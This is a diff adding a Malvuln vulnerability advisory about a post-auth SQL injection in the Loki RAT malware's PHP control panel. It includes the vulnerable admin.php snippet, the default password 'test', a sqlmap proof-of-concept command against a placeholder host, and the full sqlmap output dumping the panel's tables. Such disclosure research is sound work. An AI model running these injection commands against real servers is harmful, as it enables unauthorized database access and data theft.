@@ -1,0 +1,108 @@
+id: 37455
+date: 03/07/2022
+title: Loki RAT (Relapse) SQL Injection Vulnerability
+author: malvuln
+cves: 
+
+Discovery / credits: Malvuln - malvuln.com (c) 2022
+Original source: https://malvuln.com/advisory/aabb54951546132e70a8e9f02bf8b5ba_B.txt
+Contact: malvuln13@gmail.com
+Media: twitter.com/malvuln
+
+Threat: Loki RAT (Relapse)
+Vulnerability: SQL Injection
+Description: The LokiRAT WebUI panel for LokiRAT_Relapse.exe runs on PHP and MySQL and is used to control infected hosts through a central server.
+The backend server side code "admin.php" does not use any secure coding practices nor does it sanitize or filter user input when constructing MySQL statements.  
+
+Loki admin.php takes four parameter's pass, command, id and type. There's an auth check using $_GET['pass'] against the clear-text password "test" in settings.php.
+
+The $_GET['id'] parameter is used directly in SELECT * FROM vircom WHERE id='$id' statement used in mysql_query() func, making it vulnerable to post-auth SQL Injection.
+Authenticated users or third-party attackers who can guess the password can easily dump all databases, tables and contents including the MySQL database schema.
+
+admin.php snippet:
+
+if ($_GET['pass'] == $password) {
+  $command = $_REQUEST['command'];
+  $id = $_GET['id'];
+  $type = $_GET['type'];
+ ....
+
+  case "response":
+     $query = mysql_query("SELECT * FROM vircom WHERE id='$id'");
+     $row = mysql_fetch_array($query);
+     echo $row['retCommandNum'] . "{-}" . $row['retCommand'] . "{-}" . $row['lastUpdate'] . "{-}" . $row['updateInterval'];
+     break;
+
+Family: Loki
+Type: WebUI
+MD5: aabb54951546132e70a8e9f02bf8b5ba
+MD5: 16c33e28c8c9b3ea71249ad94be4bf94 (admin.php)
+Vuln ID: MVID-2022-0510
+Disclosure: 03/05/2022
+
+Exploit/PoC:
+sqlmap.py -u "http://LOKI-RAT-IP/PHP%20Files/admin.php?pass=test&command=webcam&id=1&type=response" --dbms=MySQL --risk=3 --level=5  --dump
+
+[21:06:25] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 11385 HTTP(s) requests:
+...
+
+back-end DBMS: MySQL >= 5.0.12
+[21:06:57] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[21:06:57] [INFO] fetching current database
+[21:06:57] [INFO] fetching tables for database: 'lokirat2'
+[21:06:57] [INFO] the SQL query used returns 2 entries
+[21:06:57] [INFO] retrieved: klcom
+[21:06:57] [INFO] retrieved: vircom
+[21:06:57] [INFO] fetching columns for table 'vircom' in database 'lokirat2'
+[21:06:57] [INFO] the SQL query used returns 13 entries
+[21:06:57] [INFO] retrieved: "id","varchar(12)"
+[21:06:57] [INFO] retrieved: "ipAddress","varchar(15)"
+[21:06:57] [INFO] retrieved: "location","varchar(255)"
+[21:06:57] [INFO] retrieved: "compName","varchar(30)"
+[21:06:57] [INFO] retrieved: "operatingSystem","varchar(100)"
+[21:06:57] [INFO] retrieved: "command","text"
+[21:06:57] [INFO] retrieved: "retCommand","text"
+[21:06:57] [INFO] retrieved: "retCommandNum","int(11)"
+[21:06:57] [INFO] retrieved: "lastUpdate","datetime"
+[21:06:57] [INFO] retrieved: "updateInterval","int(9)"
+[21:06:57] [INFO] retrieved: "ramMemory","varchar(50)"
+[21:06:57] [INFO] retrieved: "processor","varchar(255)"
+[21:06:57] [INFO] retrieved: "webcam","int(1)"
+[21:06:57] [INFO] fetching entries for table 'vircom' in database 'lokirat2'
+[21:06:57] [INFO] the SQL query used returns 1 entries
+[21:06:57] [INFO] analyzing table dump for possible password hashes
+Database: lokirat2
+Table: vircom
+[1 entry]
++----+--------+---------+----------+--------------+-----------+-----------+-----------+---------------------+------------+---------------+----------------+-----------------+
+| id | webcam | command | compName | location     | processor | ramMemory | ipAddress | lastUpdate          | retCommand | retCommandNum | updateInterval | operatingSystem |
++----+--------+---------+----------+--------------+-----------+-----------+-----------+---------------------+------------+---------------+----------------+-----------------+
+| 1  | 1      | melt    | Hate     | New York USA | Intel64   | 15gb      | 10.2.1.3  | 2022-03-05 02:43:34 | doit       | 666           | 0              | Windows         |
++----+--------+---------+----------+--------------+-----------+-----------+-----------+---------------------+------------+---------------+----------------+-----------------+
+
+[21:06:57] [INFO] table 'lokirat2.vircom' dumped to CSV file 'C:\Users\Victim\.sqlmap\output\127.0.0.1\dump\lokirat2\vircom.csv'
+[21:06:57] [INFO] fetching columns for table 'klcom' in database 'lokirat2'
+[21:06:57] [INFO] the SQL query used returns 3 entries
+[21:06:57] [INFO] retrieved: "id","varchar(15)"
+[21:06:57] [INFO] retrieved: "kldata","text"
+[21:06:57] [INFO] retrieved: "dateTime","datetime"
+[21:06:57] [INFO] fetching entries for table 'klcom' in database 'lokirat2'
+[21:06:57] [INFO] the SQL query used returns 1 entries
+[21:06:57] [INFO] analyzing table dump for possible password hashes
+Database: lokirat2
+Table: klcom
+[1 entry]
++----+----------------+---------------------+
+| id | kldata         | dateTime            |
++----+----------------+---------------------+
+| 1  | KILL PUTIN     | 2022-03-05 02:42:59 |
++----+----------------+---------------------+
+
+[21:06:57] [INFO] table 'lokirat2.klcom' dumped to CSV file 'C:\Users\Victim\.sqlmap\output\127.0.0.1\dump\lokirat2\klcom.csv'
+[21:06:57] [INFO] fetched data logged to text files under 'C:\Users\Victim\.sqlmap\output\127.0.0.1'
+
+[*] shutting down at 21:06:57
+
+#  0day.today [2023-03-25]  #
